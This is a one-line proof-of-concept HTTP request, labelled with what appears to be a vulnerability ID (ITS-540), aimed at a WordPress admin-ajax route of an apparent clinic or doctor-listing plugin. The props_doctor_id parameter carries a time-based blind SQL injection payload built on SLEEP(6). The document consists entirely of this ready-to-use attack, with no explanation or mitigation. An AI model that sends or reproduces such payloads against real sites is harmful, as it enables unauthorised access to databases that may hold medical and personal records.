# Vulnerable: ITS-540
GET /wp-admin/admin-ajax.php?action=ajax_get&route_name=get_doctor_details&clinic_id=%7B"id":"1"%7D&props_doctor_id=1,2)+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b
